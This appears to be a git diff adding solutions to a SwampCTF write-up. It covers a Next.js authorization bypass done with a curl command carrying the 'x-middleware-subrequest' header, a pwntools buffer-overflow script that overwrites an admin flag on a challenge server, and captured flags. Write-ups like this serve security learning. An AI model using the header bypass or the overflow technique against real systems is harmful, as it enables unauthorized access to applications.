@@ -38,19 +38,19 @@
 ### Challenge: Serialies
 ![image](https://github.com/user-attachments/assets/64b27c27-c8b1-4d4a-8e72-2859105706a7)
 
+After I Download the file ```serialies.zip```
+In the PersonController.java file, we find the /api/person endpoint. Navigating there gives us the flag.
 
-
+![image](https://github.com/user-attachments/assets/9bf8ffdd-7fa3-44e9-80a8-df9f40389e33)
+swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}
 
 --------------------------------
 
 
 ### Challenge: SlowAPI 
-
-![image](https://github.com/user-attachments/assets/620d23c3-b40a-4a43-a1f0-7d7bd4b8b1e1)
-
-### Source Code Analysis/
-
-
+![image](https://github.com/user-attachments/assets/7639e47e-e6fb-4373-9cc0-c5fc4bfc6e2d)
+IT The RECENT NEXT.JS VULNERABILITY!!!!
+```curl -H "x-middleware-subrequest: middleware" http://chals.swampctf.com:43611/api/protected/flag```
       
 --------------------------------
 
@@ -58,9 +58,36 @@
 ### PWN:
 
 ### Challenge: Beginner Pwn 1
+![image](https://github.com/user-attachments/assets/708c2055-022e-4c34-a702-e39f67354b5a)
 
-![image](https://github.com/user-attachments/assets/2716cfd9-3f76-4a09-a9af-ff31c1c309fc)
+- Solve script
 
+from pwn import *
+
+# Set up connection to the challenge server
+HOST = "chals.swampctf.com"
+PORT = 40004
+
+# Buffer overflow payload
+payload = b"A" * 10 + b"\x01\x00\x00\x00"  # Overwrite is_admin to 1 (true)
+
+# Start interaction
+p = remote(HOST, PORT)
+p.recvuntil(b"please enter your name: ")
+p.sendline(payload)
+
+# Read output to check if admin
+print(p.recv().decode())
+
+# Send "y" to print flag
+p.sendline(b"y")
+
+# Receive and print flag
+print(p.recvall().decode())
+
+# Close connection
+p.close()```
+ 
 ### Challenge: Beginner Pwn 2
 
 
